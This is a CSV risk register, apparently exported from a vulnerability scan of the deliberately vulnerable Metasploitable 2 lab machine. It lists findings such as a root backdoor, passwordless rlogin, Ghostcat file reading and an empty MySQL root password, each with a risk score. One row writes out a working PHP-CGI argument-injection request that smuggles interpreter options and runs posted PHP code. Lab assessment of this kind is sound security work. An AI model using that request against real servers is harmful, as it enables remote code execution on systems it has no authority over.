ip_address,asset_name,asset_owner,asset_criticality,vuln_name,description,cvss,likelihood,impact,risk_score
192.168.56.101,Metasploitable 2,KillChain,5,Possible Backdoor: Ingreslock,The service is answering to an 'id;' command with the following response: uid=0(root) gid=0(root),10.0,5,5,25
192.168.56.101,Metasploitable 2,KillChain,5,TWiki XSS and Command Execution Vulnerabilities,"Installed version: 01.Feb.2003
Fixed version:     4.2.4",10.0,5,5,25
192.168.56.101,Metasploitable 2,KillChain,5,rlogin Passwordless Login,It was possible to gain root access without a password.,10.0,5,5,25
192.168.56.101,Metasploitable 2,KillChain,5,Operating System (OS) End of Life (EOL) Detection,"The ""Ubuntu"" Operating System on the remote host has reached the end of life.

CPE:               cpe:/o:canonical:ubuntu_linux:8.04
Installed version,
build or SP:       8.04
EOL date:          2013-05-09
EOL info:          https://wiki.ubuntu.com/Releases",10.0,5,5,25
192.168.56.101,Metasploitable 2,KillChain,5,Distributed Ruby (dRuby/DRb) Multiple RCE Vulnerabilities,"The service is running in $SAFE >= 1 mode. However it is still possible to run arbitrary syscall commands on the remote host. Sending an invalid syscall the service returned the following response:

Flo:Errno::ENOSYS:bt[""3/usr/lib/ruby/1.8/drb/drb.rb:1555:in `syscall'""0/usr/lib/ruby/1.8/drb/drb.rb:1555:in `send'""4/usr/lib/ruby/1.8/drb/drb.rb:1555:in `__send__'""A/usr/lib/ruby/1.8/drb/drb.rb:1555:in `perform_without_block'""3/usr/lib/ruby/1.8/drb/drb.rb:1515:in `perform'""5/usr/lib/ruby/1.8/drb/drb.rb:1589:in `main_loop'""0/usr/lib/ruby/1.8/drb/drb.rb:1585:in `loop'""5/usr/lib/ruby/1.8/drb/drb.rb:1585:in `main_loop'""1/usr/lib/ruby/1.8/drb/drb.rb:1581:in `start'""5/usr/lib/ruby/1.8/drb/drb.rb:1581:in `main_loop'""//usr/lib/ruby/1.8/drb/drb.rb:1430:in `run'""1/usr/lib/ruby/1.8/drb/drb.rb:1427:in `start'""//usr/lib/ruby/1.8/drb/drb.rb:1427:in `run'""6/usr/lib/ruby/1.8/drb/drb.rb:1347:in `initialize'""//usr/lib/ruby/1.8/drb/drb.rb:1627:in `new'""9/usr/lib/ruby/1.8/drb/drb.rb:1627:in `start_service'""%/usr/sbin/druby_timeserver.rb:12:errnoi+:mesg""Function not implemented",10.0,5,5,25
192.168.56.101,Metasploitable 2,KillChain,5,The rexec service is running,The rexec service was detected on the target system.,10.0,5,5,25
192.168.56.101,Metasploitable 2,KillChain,5,vsftpd Compromised Source Packages Backdoor Vulnerability,,9.8,5,5,25
192.168.56.101,Metasploitable 2,KillChain,5,Apache Tomcat AJP RCE Vulnerability (Ghostcat) - Active Check,"It was possible to read the file ""/WEB-INF/web.xml"" through the AJP connector.

Result:

AB 8\x0004 Ã\x0088 \x0002OK  \x0001 \x000CContent-Type  \x001Ctext/html;charset=ISO-8859-1 AB\x001FÃ¼\x0003\x001FÃ¸<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the ""License""); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an ""AS IS"" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<?xml version=""1.0"" encoding=""ISO-8859-1""?>
<!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Strict//EN""
   ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"">

<html xmlns=""http://www.w3.org/1999/xhtml"" xml:lang=""en"" lang=""en"">
    <head>
    <title>Apache Tomcat/5.5</title>
    <style type=""text/css"">
    /*<![CDATA[*/
      body {
          color: #000000;
          background-color: #FFFFFF;
	  font-family: Arial, ""Times New Roman"", Times, serif;
          margin: 10px 0px;
      }

    img {
       border: none;
    }
    
    a:link, a:visited {
        color: blue
    }

    th {
        font-family: Verdana, ""Times New Roman"", Times, serif;
        font-size: 110%;
        font-weight: normal;
        font-style: italic;
        background: #D2A41C;
        text-align: left;
    }

    td {
        color: #000000;
	font-family: Arial, Helvetica, sans-serif;
    }
    
    td.menu {
        background: #FFDC75;
    }

    .center {
        text-align: center;
    }

    .code {
        color: #000000;
        font-family: ""Courier New"", Courier, monospace;
        font-size: 110%;
        margin-left: 2.5em;
    }
    
     #banner {
        margin-bottom: 12px;
     }

     p#congrats {
         margin-top: 0;
         font-weight: bold;
         text-align: center;
     }

     p#footer {
         text-align: right;
         font-size: 80%;
     }
     /*]]>*/
   </style>
</head>

<body>

<!-- Header -->
<table id=""banner"" width=""100%"">
    <tr>
      <td align=""left"" style=""width:130px"">
        <a href=""http://tomcat.apache.org/"">
	  <img src=""tomcat.gif"" height=""92"" width=""130"" alt=""The Mighty Tomcat - MEOW!""/>
	</a>
      </td>
      <td align=""left"" valign=""top""><b>Apache Tomcat/5.5</b></td>
      <td align=""right"">
        <a href=""http://www.apache.org/"">
	  <img src=""asf-logo-wide.gif"" height=""51"" width=""537"" alt=""The Apache Software Foundation""/>
	</a>
       </td>
     </tr>
</table>

<table>
    <tr>

        <!-- Table of Contents -->
        <td valign=""top"">
            <table width=""100%"" border=""1"" cellspacing=""0"" cellpadding=""3"">
                <tr>
		  <th>Administration</th>
                </tr>
                <tr>
		  <td class=""menu"">
		    <a href=""manager/status"">Status</a><br/>
                    <a href=""admin"">Tomcat&nbsp;Administration</a><br/>
                    <a href=""manager/html"">Tomcat&nbsp;Manager</a><br/>
                    &nbsp;
                  </td>
                </tr>
            </table>

	    <br />
            <table width=""100%"" border=""1"" cellspacing=""0"" cellpadding=""3"">
                <tr>
		  <th>Documentation</th>
                </tr>
                <tr>
                  <td class=""menu"">
                    <a href=""RELEASE-NOTES.txt"">Release&nbsp;Notes</a><br/>
                    <a href=""tomcat-docs/changelog.html"">Change&nbsp;Log</a><br/>
                    <a href=""tomcat-docs"">Tomcat&nbsp;Documentation</a><br/>                        &nbsp;
                    &nbsp;
		    </td>
                </tr>
            </table>
	    
            <br/>
            <table width=""100%"" border=""1"" cellspacing=""0"" cellpadding=""3"">
                <tr>
                  <th>Tomcat Online</th>
                </tr>
                <tr>
                  <td class=""menu"">
                    <a href=""http://tomcat.apache.org/"">Home&nbsp;Page</a><br/>
		    <a href=""http://tomcat.apache.org/faq/"">FAQ</a><br/>
                    <a href=""http://tomcat.apache.org/bugreport.html"">Bug&nbsp;Database</a><br/>
                    <a href=""http://issues.apache.org/bugzilla/buglist.cgi?bug_status=UNCONFIRMED&amp;bug_status=NEW&amp;bug_status=ASSIGNED&amp;bug_status=REOPENED&amp;bug_status=RESOLVED&amp;resolution=LATER&amp;resolution=REMIND&amp;resolution=---&amp;bugidtype=include&amp;product=Tomcat+5&amp;cmdtype=doit&amp;order=Importance"">Open Bugs</a><br/>
                    <a href=""http://mail-archives.apache.org/mod_mbox/tomcat-users/"">Users&nbsp;Mailing&nbsp;List</a><br/>
                    <a href=""http://mail-archives.apache.org/mod_mbox/tomcat-dev/"">Developers&nbsp;Mailing&nbsp;List</a><br/>
                    <a href=""irc://irc.freenode.net/#tomcat"">IRC</a><br/>
		    &nbsp;
                  </td>
                </tr>
            </table>
	    
            <br/>
            <table width=""100%"" border=""1"" cellspacing=""0"" cellpadding=""3"">
                <tr>
                  <th>Examples</th>
                </tr>
                <tr>
                  <td class=""menu"">
                    <a href=""jsp-examples/"">JSP&nbsp;Examples</a><br/>
                    <a href=""servlets-examples/"">Servlet&nbsp;Examples</a><br/>
                    <a href=""webdav/"">WebDAV&nbsp;capabilities</a><br/>
     		    &nbsp;
                  </td>
                </tr>
            </table>
	    
            <br/>
            <table width=""100%"" border=""1"" cellspacing=""0"" cellpadding=""3"">
                <tr>
		  <th>Miscellaneous</th>
                </tr>
                <tr>
                  <td class=""menu"">
                    <a href=""http://java.sun.com/products/jsp"">Sun's&nbsp;Java&nbsp;Server&nbsp;Pages&nbsp;Site</a><br/>
                    <a href=""http://java.sun.com/products/servlet"">Sun's&nbsp;Servlet&nbsp;Site</a><br/>
    		    &nbsp;
                  </td>
                </tr>
            </table>
        </td>

        <td style=""width:20px"">&nbsp;</td>
	
        <!-- Body -->
        <td align=""left"" valign=""top"">
          <p id=""congrats"">If you're seeing this page via a web browser, it means you've setup Tomcat successfully. Congratulations!</p>
 
          <p>As you may have guessed by now, this is the default Tomcat home page. It can be found on the local filesystem at:</p>
          <p class=""code"">$CATALINA_HOME/webapps/ROOT/index.jsp</p>
	  
          <p>where ""$CATALINA_HOME"" is the root of the Tomcat installation directory. If you're seeing this page, and you don't think you should be, then either you're either a user who has arrived at new installation of Tomcat, or you're an administrator who hasn't got his/her setup quite right. Providing the latter is the case, please refer to the <a href=""tomcat-docs"">Tomcat Documentation</a> for more detailed setup and administration information than is found in the INSTALL file.</p>

            <p><b>NOTE:</b> This page is precompiled. If you change it, this page will not change since
                  it was compiled into a servlet at build time.
                  (See <tt>$CATALINA_HOME/webapps/ROOT/WEB-INF/web.xml</tt> as to how it was mapped.)
            </p>

            <p><b>NOTE: For security reasons, using the administration webapp
            is restricted to users with role ""admin"". The manager webapp
            is restricted to users with role ""manager"".</b>
            Users are defined in <code>$CATALINA_HOME/conf/tomcat-users.xml</code>.</p>

            <p>Included with this release are a host of sample Servlets and JSPs (with associated source code), extensive documentation (including the Servlet 2.4 and JSP 2.0 API JavaDoc), and an introductory guide to developing web applications.</p>

            <p>Tomcat mailing lists are available at the Tomcat project web site:</p>

           <ul>
               <li><b><a href=""mailto:users@tomcat.apache.org"">users@tomc",9.8,5,5,25
192.168.56.101,Metasploitable 2,KillChain,5,MySQL / MariaDB Default Credentials (MySQL Protocol),"It was possible to login as user ""root"" with an empty password.",9.8,5,5,25
192.168.56.101,Metasploitable 2,KillChain,5,"PHP < 5.3.13, 5.4.x < 5.4.3 Multiple Vulnerabilities - Active Check","By doing the following HTTP POST request:

""HTTP POST"" body : <?php phpinfo();?>
URL              : http://192.168.56.101/cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E

it was possible to execute the ""<?php phpinfo();?>"" command.

Result:
  <title>phpinfo()</title><meta name=""ROBOTS"" content=""NOINDEX,NOFOLLOW,NOARCHIVE"" /></head>
  <tr><td class=""e"">Configuration File (php.ini) Path </td><td class=""v"">/etc/php5/cgi </td></tr>
  <h2>PHP Variables</h2>",9.8,5,5,25
